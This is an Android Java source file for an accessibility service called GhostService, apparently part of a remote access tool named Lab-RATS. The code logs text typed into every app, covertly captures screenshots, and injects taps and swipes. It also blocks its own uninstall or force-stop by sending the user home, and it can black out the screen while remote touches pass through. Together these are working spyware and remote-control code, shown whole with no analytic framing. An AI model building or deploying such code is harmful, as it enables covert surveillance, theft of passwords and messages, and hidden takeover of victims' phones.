package com.labs.labrats;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Intent;
import android.graphics.Path;
import android.graphics.Point;
import android.os.Build;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.ArrayList;
import java.util.List;

public class GhostService extends AccessibilityService {
    private static final String TAG = "GhostService";
    private static GhostService instance;

    private static final List<String> keystrokes = new java.util.concurrent.CopyOnWriteArrayList<>();
    private String lastPackage = "";
    private static volatile boolean skipAntiRemoval = false;

    private int screenWidth = 0;
    private int screenHeight = 0;

    public static GhostService getInstance() { return instance; }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        
        WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
        android.view.Display display = wm.getDefaultDisplay();
        Point size = new Point();
        display.getRealSize(size);
        screenWidth = size.x;
        screenHeight = size.y;
        
        Log.d(TAG, "Ghost Uplink Established. " + screenWidth + "x" + screenHeight);
    }

    public int getScreenWidth() { return screenWidth; }
    public int getScreenHeight() { return screenHeight; }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
        if (!skipAntiRemoval && (packageName.equals("com.android.settings") || packageName.contains("packageinstaller"))) {
            checkAntiRemoval(event);
        }
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || 
            event.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED || 
            event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            captureInput(event, packageName);
        }
    }

    private void checkAntiRemoval(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source == null) return;
        List<AccessibilityNodeInfo> nodes = source.findAccessibilityNodeInfosByText("Lab-RATS");
        if (nodes == null || nodes.isEmpty()) nodes = source.findAccessibilityNodeInfosByText("LAB-RATS");
        if (nodes != null && !nodes.isEmpty()) {
            List<AccessibilityNodeInfo> uninstallButtons = source.findAccessibilityNodeInfosByText("Uninstall");
            if (uninstallButtons == null || uninstallButtons.isEmpty()) uninstallButtons = source.findAccessibilityNodeInfosByText("Force stop");
            if (uninstallButtons != null && !uninstallButtons.isEmpty()) {
                LabRatsHttpServer.logActivity("GHOST_PROTOCOL: Prevented removal.");
                performGlobalAction(GLOBAL_ACTION_HOME);
            }
        }
    }

    private void captureInput(AccessibilityEvent event, String pkg) {
        if (event.getText() == null || event.getText().isEmpty()) return;
        String text = event.getText().get(0).toString();
        if (!text.isEmpty() && !text.equals("null")) {
            if (!pkg.equals(lastPackage)) {
                logKeystroke("\n[" + pkg + "] -> ");
                lastPackage = pkg;
            }
            logKeystroke(text + " ");
        }
    }

    private void logKeystroke(String msg) {
        keystrokes.add(msg);
        while (keystrokes.size() > 500) keystrokes.remove(0);
    }

    public static List<String> getKeystrokes() { return new ArrayList<>(keystrokes); }
    public static void clearKeystrokes() { keystrokes.clear(); }

    // ============ BLACKOUT PROTOCOL ============

    private View blackoutView;

    public void startBlackout(final boolean enabled) {
        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
            try {
                WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
                if (enabled) {
                    if (blackoutView == null) {
                        blackoutView = new View(GhostService.this);
                        blackoutView.setBackgroundColor(android.graphics.Color.BLACK);
                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                WindowManager.LayoutParams.MATCH_PARENT,
                                WindowManager.LayoutParams.MATCH_PARENT,
                                (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 2032 : 2003,
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, // Allow interaction through mask
                                android.graphics.PixelFormat.OPAQUE);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                            params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
                        }
                        wm.addView(blackoutView, params);
                        LabRatsHttpServer.logActivity("GHOST_PROTOCOL: Blackout Mode ACTIVE");
                    }
                } else {
                    if (blackoutView != null) {
                        wm.removeViewImmediate(blackoutView);
                        blackoutView = null;
                        LabRatsHttpServer.logActivity("GHOST_PROTOCOL: Blackout Mode DISABLED");
                    }
                }
            } catch (Exception e) { Log.e(TAG, "Blackout Error: " + e.getMessage()); }
        });
    }

    public void runAutoHeal() {
        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
            try {
                skipAntiRemoval = true; 
                LabRatsHttpServer.logActivity("GHOST_MAINTENANCE: Self-Healing...");
                Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(intent);
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> skipAntiRemoval = false, 15000);
            } catch (Exception e) { LabRatsHttpServer.logActivity("GHOST_ERROR: Auto-Heal failed"); }
        });
    }

    // ============ INTERACTION ============

    public boolean clickAt(int x, int y) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false;
        Path path = new Path(); path.moveTo(x, y);
        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, 50);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);
        return dispatchGesture(builder.build(), null, null);
    }

    public boolean swipe(int x1, int y1, int x2, int y2, int duration) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false;
        Path path = new Path(); path.moveTo(x1, y1); path.lineTo(x2, y2);
        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, Math.max(duration, 100));
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);
        return dispatchGesture(builder.build(), null, null);
    }

    // ============ SCREENSHOT ============

    public interface ScreenshotCallback { void onSuccess(byte[] jpegData); void onFailure(String error); }
    private volatile boolean isScreenshotting = false;

    public void takeCovertScreenshot(final ScreenshotCallback callback) {
        if (isScreenshotting) { callback.onFailure("BUSY"); return; }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            isScreenshotting = true;
            takeScreenshot(android.view.Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
                @Override
                public void onSuccess(ScreenshotResult screenshotResult) {
                    isScreenshotting = false;
                    android.hardware.HardwareBuffer hardwareBuffer = screenshotResult.getHardwareBuffer();
                    try {
                        android.graphics.Bitmap bitmap = android.graphics.Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshotResult.getColorSpace());
                        if (bitmap != null) {
                            android.graphics.Bitmap softwareBitmap = bitmap.copy(android.graphics.Bitmap.Config.ARGB_8888, false);
                            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
                            softwareBitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, out);
                            callback.onSuccess(out.toByteArray());
                            softwareBitmap.recycle(); bitmap.recycle();
                        } else { callback.onFailure("Buffer wrap failed"); }
                    } catch (Exception e) { callback.onFailure(e.getMessage()); } 
                    finally { if (hardwareBuffer != null) hardwareBuffer.close(); }
                }
                @Override
                public void onFailure(int i) {
                    isScreenshotting = false;
                    callback.onFailure("OS Error: " + i);
                }
            });
            // Watchdog
            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> isScreenshotting = false, 5000);
        } else { callback.onFailure("Android 11+ Required"); }
    }

    @Override public void onInterrupt() {}
    @Override public void onDestroy() { super.onDestroy(); instance = null; }
}
